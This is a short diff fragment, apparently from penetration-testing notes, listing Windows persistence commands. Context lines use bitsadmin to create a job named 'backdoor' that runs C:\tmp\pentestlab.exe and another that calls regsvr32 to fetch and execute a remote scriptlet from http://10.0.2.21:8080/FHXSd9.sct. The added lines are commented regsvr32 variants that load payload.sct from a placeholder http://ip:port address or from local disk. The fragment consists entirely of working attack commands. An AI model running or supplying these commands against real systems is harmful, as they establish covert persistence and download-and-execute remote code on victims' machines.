@@ -21,6 +21,10 @@ bitsadmin /SetNotifyCmdLine backdoor C:\tmp\pentestlab.exe NUL
 bitsadmin /SetMinRetryDelay "backdoor" 60
 bitsadmin /resume backdoor
 
+##  regsvr32 /u /n /s /i:http://ip:port/payload.sct scrobj.dll
+
+##  regsvr32 /u /n /s /i:payload.sct scrobj.dll
+
 bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.0.2.21:8080/FHXSd9.sct scrobj.dll"
 bitsadmin /resume backdoor
 
